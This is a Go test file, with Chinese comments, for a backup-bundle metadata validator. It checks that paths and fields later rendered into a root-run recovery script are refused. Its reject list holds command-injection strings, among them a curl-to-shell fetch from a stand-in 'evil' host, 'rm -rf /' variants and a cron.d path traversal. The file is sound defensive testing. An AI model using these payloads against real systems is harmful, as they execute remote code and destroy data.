package backupbundle

import (
	"encoding/json"
	"strings"
	"testing"
)

func validPayloadMeta() PayloadMeta {
	return PayloadMeta{
		RecipientSlot:            "A",
		AgentVersion:             "2026-09-15-abc1234",
		AgentKeyFingerprint:      strings.Repeat("a", 16),
		BackupSigningFingerprint: strings.Repeat("b", 64),
		Tenants: []Tenant{
			{Slug: "acme", Domain: "api.acme.example", HasKeystore: true, SignerSHA256: strings.Repeat("c", 64)},
		},
		InnerFiles: []FileEntry{
			{Path: "agent-key", Size: 32, SHA256: strings.Repeat("d", 64),
				Target: "/var/lib/rn-build-agent/agent-key", Mode: "0600", Owner: "builder:builder"},
		},
	}
}

func encodePayloadMeta(t *testing.T, meta PayloadMeta) []byte {
	t.Helper()
	raw, err := json.Marshal(meta)
	if err != nil {
		t.Fatal(err)
	}
	return raw
}

func TestBackupMetaAcceptsAWellFormedReport(t *testing.T) {
	parsed, err := ParsePayloadMeta(encodePayloadMeta(t, validPayloadMeta()))
	if err != nil {
		t.Fatalf("a well-formed report must be accepted: %v", err)
	}
	if parsed.RecipientSlot != "A" || len(parsed.Tenants) != 1 || len(parsed.InnerFiles) != 1 {
		t.Fatalf("round-trip lost something: %+v", parsed)
	}
}

// 这一组是本文件存在的理由。
//
// innerFiles[].path 和 .target 会被渲染进 recover.sh，而那个脚本恢复时以 root 跑。
// 一条带 $(...) 的路径没有任何正当理由出现在备份包里——它只可能是攻击，或者一个
// 严重到必须让人看见的 bug。所以直接拒收，不做转义。
func TestBackupMetaRefusesPathsThatWouldBecomeCommands(t *testing.T) {
	poison := []string{
		"agent-key$(curl http://evil/x|sh)",
		"agent-key`id`",
		"agent-key; rm -rf /",
		"agent-key\nrm -rf /",
		`agent-key" && rm -rf / && echo "`,
		"agent-key'",
		"agent-key|tee /etc/passwd",
		"agent-key&whoami",
		"../../etc/cron.d/backdoor",
		"a/../../b",
		"agent-key\\",
		"agent-key>out",
		"agent-key*",
		"",
		"   ",
	}
	for _, bad := range poison {
		t.Run(strings.ReplaceAll(bad, "\n", "\\n"), func(t *testing.T) {
			meta := validPayloadMeta()
			meta.InnerFiles[0].Path = bad
			if _, err := ParsePayloadMeta(encodePayloadMeta(t, meta)); err == nil {
				t.Fatalf("path %q was accepted; it would be rendered into recover.sh", bad)
			}
			// target 走同一条渲染路径，同样要挡
			meta = validPayloadMeta()
			meta.InnerFiles[0].Target = bad
			if _, err := ParsePayloadMeta(encodePayloadMeta(t, meta)); err == nil {
				t.Fatalf("target %q was accepted", bad)
			}
		})
	}
}

// 正常路径不能被误伤：点、斜杠、连字符、下划线都要放行
func TestBackupMetaAcceptsOrdinaryPaths(t *testing.T) {
	for _, good := range []string{
		"agent-key",
		"keystores/acme/keystore.p12",
		"systemd/rn-build-agent.service",
		"bin/build-agent",
		"/etc/rn-build-agent.env",
		"/var/lib/rn-build-agent/agent-key",
		"ssh/id_deploy",
	} {
		meta := validPayloadMeta()
		meta.InnerFiles[0].Path = good
		meta.InnerFiles[0].Target = "/opt/" + strings.TrimPrefix(good, "/")
		if _, err := ParsePayloadMeta(encodePayloadMeta(t, meta)); err != nil {
			t.Fatalf("ordinary path %q was refused: %v", good, err)
		}
	}
}

// 库里的 slug 没有格式约束，线上就有 AnyFun。当初按「都是小写」定的规则让所有租户的密钥
// 解开封好之后，整次备份死在上传这一步
func TestBackupMetaAcceptsTheSlugsTenantsActuallyHave(t *testing.T) {
	for _, slug := range []string{"AnyFun", "anyfun", "rwa_test2", "100000001", "predict-v2", "a.b"} {
		meta := validPayloadMeta()
		meta.Tenants[0].Slug = slug
		if _, err := ParsePayloadMeta(encodePayloadMeta(t, meta)); err != nil {
			t.Errorf("slug %q 应当被接受: %v", slug, err)
		}
	}
}

func TestBackupMetaFieldValidation(t *testing.T) {
	cases := []struct {
		name string
		edit func(*PayloadMeta)
		want string
	}{
		{"unknown slot", func(m *PayloadMeta) { m.RecipientSlot = "D" }, "recipientSlot"},
		{"empty slot", func(m *PayloadMeta) { m.RecipientSlot = "" }, "recipientSlot"},
		// 两种指纹形式不能混：16 字符是 agent-key，64 字符是备份签名公钥
		{"agent fingerprint wrong length", func(m *PayloadMeta) {
			m.AgentKeyFingerprint = strings.Repeat("a", 64)
		}, "16 lowercase hex"},
		{"signing fingerprint wrong length", func(m *PayloadMeta) {
			m.BackupSigningFingerprint = strings.Repeat("b", 16)
		}, "64 lowercase hex"},
		{"fingerprint not hex", func(m *PayloadMeta) {
			m.AgentKeyFingerprint = strings.Repeat("Z", 16)
		}, "16 lowercase hex"},
		{"no tenants", func(m *PayloadMeta) { m.Tenants = nil }, "tenants is empty"},
		{"slug not slug-shaped", func(m *PayloadMeta) { m.Tenants[0].Slug = "Acme Corp" }, "slug"},
		{"slug with a slash", func(m *PayloadMeta) { m.Tenants[0].Slug = "a/b" }, "slug"},
		{"slug that walks up", func(m *PayloadMeta) { m.Tenants[0].Slug = ".." }, "slug"},
		{"slug that looks like an option", func(m *PayloadMeta) { m.Tenants[0].Slug = "-rf" }, "slug"},
		{"slug that hides itself", func(m *PayloadMeta) { m.Tenants[0].Slug = ".hidden" }, "slug"},
		{"duplicate slug", func(m *PayloadMeta) {
			m.Tenants = append(m.Tenants, m.Tenants[0])
		}, "appears twice"},
		// macOS 默认不分大小写：AnyFun 和 anyfun 会落进同一个目录
		{"duplicate slug differing only in case", func(m *PayloadMeta) {
			other := m.Tenants[0]
			other.Slug = strings.ToUpper(other.Slug)
			m.Tenants = append(m.Tenants, other)
		}, "appears twice"},
		{"no inner files", func(m *PayloadMeta) { m.InnerFiles = nil }, "innerFiles is empty"},
		{"mode not octal", func(m *PayloadMeta) { m.InnerFiles[0].Mode = "rw-------" }, "mode"},
		{"mode missing leading zero", func(m *PayloadMeta) { m.InnerFiles[0].Mode = "600" }, "mode"},
		{"owner not user:group", func(m *PayloadMeta) { m.InnerFiles[0].Owner = "root" }, "owner"},
		{"owner with shell metachar", func(m *PayloadMeta) { m.InnerFiles[0].Owner = "a$b:c" }, "owner"},
		{"file sha not 64 hex", func(m *PayloadMeta) { m.InnerFiles[0].SHA256 = "abc" }, "sha256"},
		{"negative size", func(m *PayloadMeta) { m.InnerFiles[0].Size = -1 }, "negative"},
		{"agent version with metachar", func(m *PayloadMeta) { m.AgentVersion = "v1;rm -rf /" }, "agentVersion"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			meta := validPayloadMeta()
			tc.edit(&meta)
			_, err := ParsePayloadMeta(encodePayloadMeta(t, meta))
			if err == nil {
				t.Fatal("expected a refusal")
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Fatalf("the error should mention %q, got: %v", tc.want, err)
			}
		})
	}
}

// 未知字段要拒掉：打包机和服务端版本不一致时，静默忽略一个字段意味着
// 服务端按一份它读不全的元数据去渲染恢复说明，而那份说明要在灾难当天被照着执行
func TestBackupMetaRefusesUnknownFields(t *testing.T) {
	raw := encodePayloadMeta(t, validPayloadMeta())
	var generic map[string]any
	if err := json.Unmarshal(raw, &generic); err != nil {
		t.Fatal(err)
	}
	generic["somethingNew"] = "from a newer agent"
	extended, err := json.Marshal(generic)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := ParsePayloadMeta(extended); err == nil {
		t.Fatal("an unknown field was silently ignored")
	}
}

// meta 排在 payload 之前就是为了在收那 512 MiB 之前拒掉坏的元数据；
// 它自己也要有上限，否则「先解析再决定」这句话不成立
func TestBackupMetaHasItsOwnSizeLimit(t *testing.T) {
	meta := validPayloadMeta()
	for i := 0; i < backupMaxTenants; i++ {
		meta.Tenants = append(meta.Tenants, Tenant{
			Slug: strings.Repeat("a", 200) + "-" + strings.Repeat("b", 200), Domain: "x.example",
		})
	}
	if _, err := ParsePayloadMeta(encodePayloadMeta(t, meta)); err == nil {
		t.Fatal("an oversized meta was accepted")
	}
}
